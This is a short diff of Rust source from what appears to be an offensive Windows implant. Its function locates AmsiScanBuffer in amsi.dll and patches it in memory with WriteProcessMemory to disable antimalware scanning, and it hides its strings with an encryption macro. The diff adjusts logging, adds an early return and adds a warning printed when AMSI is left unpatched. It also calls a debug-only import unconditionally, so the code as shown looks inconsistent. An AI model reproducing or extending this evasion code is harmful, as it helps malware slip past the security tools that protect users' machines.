@@ -1,5 +1,7 @@
 use std::ffi::c_void;
 
+#[cfg(debug_assertions)]
+use shared::pretty_print::print_info;
 use str_crypter::{decrypt_string, sc};
 use windows_sys::Win32::System::{
     Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
@@ -33,8 +35,7 @@ pub fn patch_amsi_if_ft_flag() {
 
         use crate::utils::export_resolver::resolve_address;
 
-        #[cfg(debug_assertions)]
-        print_info("Patching amsi..");
+        print_info(sc!("Patching amsi..", 49).unwrap());
 
         let fn_addr = match resolve_address(&sc!("amsi.dll", 42).unwrap(), "AmsiScanBuffer", None) {
             Ok(a) => a,
@@ -61,7 +62,11 @@ pub fn patch_amsi_if_ft_flag() {
                 &mut bytes_written,
             )
         };
+
+        return;
     }
+
+    print_info(sc!("WARNING: Not patching AMSI. This could be dangerous.", 49).unwrap());
 }
 
 fn etw() {
